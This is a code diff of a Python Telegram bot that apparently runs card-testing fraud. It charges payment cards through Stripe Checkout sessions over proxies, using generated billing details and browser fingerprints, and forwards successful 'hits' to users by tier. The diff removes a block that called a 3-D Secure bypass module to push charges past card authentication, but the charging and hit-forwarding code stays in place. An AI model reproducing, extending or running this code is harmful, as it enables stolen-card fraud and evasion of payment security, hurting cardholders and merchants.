@@ -15997,15 +15997,11 @@ async def get_checkout_session_stco(cs_id: str, pk: str, proxy: str = None) -> D
 
 # ============ UPDATED CHARGE FUNCTION - FIXED EMAIL ============
 
-# Add this import at the top of your file
-from stripe_3ds_bypasser import Stripe3DSBypasser
-
-# Update the charge_single_card_stco function
 async def charge_single_card_stco(card, checkout_data: dict, session_data: dict, proxy_str: str = None, 
                                    bypass_3ds: bool = False, max_retries: int = 3) -> dict:
     """
     Charge a card using Stripe Checkout with TLS bypass and connection pooling
-    Includes 3DS bypass for better success rate
+    Uses the session's pre-set email instead of generating a new one
     """
     start = time.perf_counter()
     print(f"💳 Starting charge for card: {card if isinstance(card, str) else card.get('cc', '')[:6]}******")
@@ -16051,6 +16047,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
     if proxy_str:
         proxy_url = format_proxy_stco(proxy_str)
         if proxy_url:
+            # Validate proxy format
             try:
                 clean_proxy = proxy_url.replace('http://', '').replace('https://', '')
                 if '@' in clean_proxy:
@@ -16059,7 +16056,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     host_port = clean_proxy
                 if ':' in host_port:
                     host, port = host_port.rsplit(':', 1)
-                    int(port)
+                    int(port)  # Validate port is a number
                     debug_print(2, f"🔌 Using proxy: {mask_proxy(proxy_url)}")
                 else:
                     debug_print(1, f"⚠️ Invalid proxy format, using direct connection")
@@ -16109,6 +16106,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             
             fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(cs, pk, proxy_url)
             
+            # If fresh init fails, try to re-decode from URL
             if fresh_init_data is None and raw_url:
                 debug_print(3, f"🔄 Fresh init failed, re-decoding from raw URL...")
                 fresh_checkout = await get_checkout_info_stripe(raw_url)
@@ -16118,6 +16116,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     if fresh_pk and fresh_cs:
                         fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(fresh_cs, fresh_pk, proxy_url)
             
+            # Check if fresh_init_data is None
             if fresh_init_data is None:
                 debug_print(1, f"❌ Failed to get fresh init data on attempt {attempt + 1}")
                 attempt_data["status"] = "failed"
@@ -16125,6 +16124,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 result["attempts"].append(attempt_data)
                 
                 if attempt < max_retries:
+                    # If proxy error, try without proxy
                     if proxy_url and "proxy" in str(init_response or "").lower():
                         debug_print(3, f"🔄 Proxy error, retrying without proxy...")
                         proxy_url = None
@@ -16175,11 +16175,13 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 subtotal = total
                 debug_print(3, f"💰 Total from payment_intent: {total/100:.2f}")
             
+            # If still 0, try to get from session data
             if total == 0:
                 total = session_data.get("amount", 0)
                 subtotal = total
                 debug_print(3, f"💰 Total from session_data: {total/100:.2f}")
             
+            # If still 0, try from display info
             if total == 0 and display_info:
                 price = display_info.get("price", 0)
                 if price:
@@ -16187,6 +16189,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     subtotal = total
                     debug_print(3, f"💰 Total from display_info: {total/100:.2f}")
             
+            # For subscriptions, check the plan amount
             if init_data.get("mode") == "subscription":
                 sub_plan = init_data.get("subscription_data", {}).get("plan", {})
                 if sub_plan and sub_plan.get("amount"):
@@ -16194,11 +16197,16 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     subtotal = total
                     debug_print(3, f"💰 Total from subscription plan: {total/100:.2f}")
 
+            # Get checksum
             checksum = init_data.get("init_checksum", "")
 
+            # Generate billing details
             billing = generate_fresh_billing_details()
+            
+            # Use session email
             billing['email'] = customer_email
             
+            # Generate name from email
             if '@' in customer_email:
                 name_part = customer_email.split('@')[0]
                 name_parts = name_part.replace('.', ' ').replace('_', ' ').split()
@@ -16284,6 +16292,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             body = urlencode(confirm_params)
             
             debug_print(3, f"📤 Sending confirm request for session {cs[:20]}...")
+            debug_print(4, f"📤 Headers: {json.dumps(elements_headers, indent=2)}")
             
             # ============ FRESH HTTP CLIENT PER ATTEMPT ============
             client_kwargs = {
@@ -16324,6 +16333,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 # ============ FIX: Handle amount mismatch error ============
                 if error_code == "checkout_amount_mismatch":
                     debug_print(1, f"⚠️ Amount mismatch detected, retrying with correct amount...")
+                    # Try to get the amount from the error response
                     if attempt < max_retries:
                         await asyncio.sleep(1)
                         continue
@@ -16365,65 +16375,11 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     result["status"] = "CHARGED"
                     result["response"] = "Payment Successful"
                     debug_print(2, f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
-                    
                 elif st == "requires_action":
-                    # ============ 3DS BYPASS ============
-                    debug_print(2, f"🔐 3DS Required - Attempting bypass...")
-                    
-                    # Prepare data for 3DS bypasser
-                    bypass_result = {
-                        'raw_response': conf,
-                        'pk_key': pk,
-                    }
-                    
-                    # Setup proxy for bypasser
-                    proxy_data = None
-                    if proxy_url:
-                        # Parse proxy for bypasser
-                        proxy_data = {'server': proxy_url}
-                        if '@' in proxy_url:
-                            auth_part = proxy_url.split('@')[0]
-                            if '://' in auth_part:
-                                auth_part = auth_part.split('://')[1]
-                            if ':' in auth_part:
-                                user, pwd = auth_part.split(':', 1)
-                                proxy_data['username'] = user
-                                proxy_data['password'] = pwd
-                    
-                    # Profile for bypasser
-                    profile = {
-                        'user_agent': fp["ua"],
-                        'tz_offset': '-300',
-                        'color_depth': '24',
-                        'impersonate': 'chrome131'
-                    }
-                    
-                    try:
-                        # Run 3DS bypass
-                        bypassed = await Stripe3DSBypasser.resolve_3ds(
-                            bypass_result,
-                            proxy_data=proxy_data,
-                            profile=profile
-                        )
-                        
-                        if bypassed.get('success') and bypassed.get('is_live'):
-                            result["status"] = "CHARGED"
-                            result["response"] = "Payment Successful (3DS Bypassed)"
-                            result["3ds_bypassed"] = True
-                            debug_print(2, f"✅✅✅ 3DS BYPASSED! CHARGED SUCCESSFULLY! ✅✅✅")
-                        else:
-                            result["status"] = "3DS"
-                            result["response"] = "3DS Required (Bypass failed)"
-                            result["3ds_attempted"] = True
-                            result["3ds_status"] = bypassed.get('3ds_status', 'failed')
-                            debug_print(2, f"🔐 3DS Bypass failed - status: {result['3ds_status']}")
-                            
-                    except Exception as e:
-                        debug_print(1, f"❌ 3DS Bypass error: {e}")
-                        result["status"] = "3DS"
-                        result["response"] = "3DS Required (Bypass error)"
-                        result["3ds_error"] = str(e)[:100]
-                    
+                    # 🔧 CHANGED: 3DS bypass removed
+                    result["status"] = "3DS" if not bypass_3ds else "3DS SKIP"
+                    result["response"] = "3DS Required" if not bypass_3ds else "3DS Cannot be bypassed"
+                    debug_print(2, f"🔐 3DS Required")
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
                     result["response"] = "Card Declined"
@@ -16444,6 +16400,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
+                # If proxy timeout, try without proxy
                 if proxy_url:
                     debug_print(3, f"🔄 Proxy timeout, retrying without proxy...")
                     proxy_url = None
@@ -16483,6 +16440,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             result["attempts"].append(attempt_data)
             
             if attempt < max_retries:
+                # If proxy error, try without proxy
                 if "Invalid port" in error_str or "proxy" in error_str.lower():
                     debug_print(3, f"🔄 Proxy error, retrying without proxy...")
                     proxy_url = None
@@ -16499,7 +16457,6 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
     result["time"] = round(time.perf_counter() - start, 2)
     debug_print(1, f"❌ All attempts failed: {result['status']} - {result['response']}")
     return result
-
 
 
 
@@ -16912,7 +16869,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     gateway="Stripe Checkout",
                     response=charged_card_data['response'],
                     price=charged_card_data['price'],
-                    site=charged_card_data.get('site', 'Unknown'),
                     bin_info=bin_info if 'bin_info' in locals() else None,
                     user_id=user_id,
                     user_tier=user_manager.get_tier(user_id),
@@ -16921,7 +16877,6 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             print(f"⚠️ [HIT FORWARDER] Error: {e}")
-
 
 
 
